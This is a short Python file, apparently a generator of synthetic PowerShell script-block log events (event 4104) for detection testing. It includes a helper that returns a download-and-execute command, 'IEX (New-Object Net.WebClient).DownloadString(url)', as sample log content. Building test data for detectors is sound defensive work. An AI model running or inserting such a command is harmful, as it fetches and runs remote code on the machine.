import base64
import uuid
from datetime import datetime

def gen_powershell_script(host, user, ts, script_text, encoded=False):
    payload = script_text
    if encoded:
        payload = base64.b64encode(script_text.encode()).decode()
    return {
        "@timestamp": ts.isoformat(),
        "log.source_type": "powershell",
        "event_id": 4104,
        "host": {"name": host, "os": "windows"},
        "user": {"name": user},
        "message": "PowerShell script block",
        "script_block_text": payload,
        "script_block_decoded": script_text if encoded else None,
        "event_uuid": str(uuid.uuid4()),
    }


def sample_download_execute(url):
    return f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
